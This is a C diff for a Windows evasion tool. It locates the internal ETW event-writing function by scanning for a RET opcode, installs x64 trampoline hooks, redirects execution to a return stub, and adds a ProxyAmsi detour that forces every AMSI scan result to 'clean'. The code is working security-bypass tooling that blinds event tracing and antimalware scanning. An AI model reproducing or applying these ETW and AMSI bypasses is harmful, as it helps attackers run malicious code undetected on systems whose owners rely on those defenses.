@@ -33,11 +33,9 @@ BOOL GetEtwpEventWriteFull(OUT PVOID* ppFunction)
 	{
 		BYTE opcode = pEtwEventWriteEx[i];
 
-		// We have reached the RET instruction, stop there
+		// 2. We have reached the RET instruction, stop there
 		if (pEtwEventWriteEx[i] == 0xC3) 
 		{
-			// 2. Save the value into a temporary variable
-			pTemp = pEtwEventWriteEx[i];
 			break;
 		}
 		i++;
@@ -115,6 +113,7 @@ BOOL TrampolineX64(IN PVOID pHookedFunction, IN PVOID pDetourFunction, OUT PVOID
 #ifdef DEBUG
 		printf("[DBG] Failed to change memory protection: %d\n", GetLastError());
 #endif
+		return FALSE;
 	}
 #ifdef DEBUG
 	printf("[DBG] Value of dwOldProtect in hook.c is: %d\n", dwOldProtect);
@@ -163,3 +162,10 @@ VOID BlockExecutionFlow(PCONTEXT pCtx)
 	pCtx->Rip = (ULONG_PTR)&RetStub;
 }
 
+HRESULT WINAPI ProxyAmsi(HAMSICONTEXT ctx, PVOID buf, ULONG len, LPCWSTR name, HAMSISESSION sess, AMSI_RESULT* pRes)
+{
+	// Changing the return value
+	*pRes = AMSI_RESULT_CLEAN;
+	// returning SUCESS code
+	return S_OK;
+}
